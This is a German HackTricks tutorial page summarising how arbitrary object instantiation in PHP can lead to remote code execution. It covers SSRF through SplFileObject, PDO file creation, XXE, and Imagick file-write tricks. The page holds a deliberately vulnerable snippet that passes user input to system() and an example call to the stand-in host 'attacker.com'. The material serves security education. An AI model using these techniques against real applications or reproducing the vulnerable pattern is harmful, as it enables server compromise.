# PHP - RCE durch Ausnutzung der Objekterstellung: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

Dies ist im Grunde eine Zusammenfassung von [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Einf√ºhrung

Die Erstellung neuer willk√ºrlicher Objekte, wie `new $_GET["a"]($_GET["a"])`, kann zu Remote Code Execution (RCE) f√ºhren, wie in einem [**Bericht**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) detailliert beschrieben. Dieses Dokument hebt verschiedene Strategien zur Erreichung von RCE hervor.

## RCE √ºber benutzerdefinierte Klassen oder Autoloading

Die Syntax `new $a($b)` wird verwendet, um ein Objekt zu instanziieren, wobei **`$a`** den Klassennamen darstellt und **`$b`** das erste Argument ist, das an den Konstruktor √ºbergeben wird. Diese Variablen k√∂nnen aus Benutzereingaben wie GET/POST stammen, wo sie Strings oder Arrays sein k√∂nnen, oder aus JSON, wo sie als andere Typen erscheinen k√∂nnten.

Betrachten Sie den folgenden Codeausschnitt:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
In diesem Fall f√ºhrt das Setzen von `$a` auf `App` oder `App2` und `$b` auf einen Systembefehl (z.B. `uname -a`) zur Ausf√ºhrung dieses Befehls.

**Autoloading-Funktionen** k√∂nnen ausgenutzt werden, wenn solche Klassen nicht direkt zug√§nglich sind. Diese Funktionen laden automatisch Klassen aus Dateien, wenn sie ben√∂tigt werden, und sind definiert mit `spl_autoload_register` oder `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Das Verhalten des Autoloadings variiert je nach PHP-Version und bietet unterschiedliche RCE-M√∂glichkeiten.

## RCE √ºber eingebaute Klassen

Ohne benutzerdefinierte Klassen oder Autoloader k√∂nnen **eingebaute PHP-Klassen** f√ºr RCE ausreichen. Die Anzahl dieser Klassen liegt je nach PHP-Version und Erweiterungen zwischen 100 und 200. Sie k√∂nnen mit `get_declared_classes()` aufgelistet werden.

Konstruktoren von Interesse k√∂nnen √ºber die Reflection-API identifiziert werden, wie im folgenden Beispiel und dem Link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) gezeigt.

**RCE √ºber spezifische Methoden umfasst:**

### **SSRF + Phar Deserialisierung**

Die Klasse `SplFileObject` erm√∂glicht SSRF √ºber ihren Konstruktor und erlaubt Verbindungen zu jeder URL:
```php
new SplFileObject('http://attacker.com/');
```
SSRF kann in PHP-Versionen vor 8.0 zu Deserialisierungsangriffen f√ºhren, wenn das Phar-Protokoll verwendet wird.

### **Ausnutzen von PDOs**

Der Konstruktor der PDO-Klasse erm√∂glicht Verbindungen zu Datenbanken √ºber DSN-Strings, was potenziell die Erstellung von Dateien oder andere Interaktionen erm√∂glicht:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Versionen von PHP bis 5.3.22 und 5.4.12 waren anf√§llig f√ºr XXE-Angriffe √ºber die `SoapClient`- und `SimpleXMLElement`-Konstruktoren, abh√§ngig von der Version von libxml2.

## RCE √ºber die Imagick-Erweiterung

Bei der Analyse der **Abh√§ngigkeiten eines Projekts** wurde festgestellt, dass **Imagick** f√ºr die **Befehlsausf√ºhrung** durch die Instanziierung neuer Objekte genutzt werden kann. Dies bietet eine M√∂glichkeit, Schwachstellen auszunutzen.

### VID-Parser

Die F√§higkeit des VID-Parsers, Inhalte an einen beliebigen angegebenen Pfad im Dateisystem zu schreiben, wurde identifiziert. Dies k√∂nnte zur Platzierung einer PHP-Shell in einem webzug√§nglichen Verzeichnis f√ºhren, was Remote Code Execution (RCE) erm√∂glicht.

#### VID-Parser + Datei-Upload

Es wird angemerkt, dass PHP hochgeladene Dateien vor√ºbergehend in `/tmp/phpXXXXXX` speichert. Der VID-Parser in Imagick, der das **msl**-Protokoll verwendet, kann Platzhalter in Dateipfaden verarbeiten, was den Transfer der tempor√§ren Datei an einen gew√§hlten Ort erleichtert. Diese Methode bietet einen zus√§tzlichen Ansatz, um beliebige Dateien im Dateisystem zu schreiben.

### PHP-Absturz + Brute Force

Eine Methode, die im [**originalen Bericht**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) beschrieben wird, beinhaltet das Hochladen von Dateien, die einen Serverabsturz ausl√∂sen, bevor sie gel√∂scht werden. Durch Brute-Forcing des Namens der tempor√§ren Datei wird es m√∂glich, dass Imagick beliebigen PHP-Code ausf√ºhrt. Diese Technik wurde jedoch nur in einer veralteten Version von ImageMagick als effektiv befunden.

## Referenzen

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
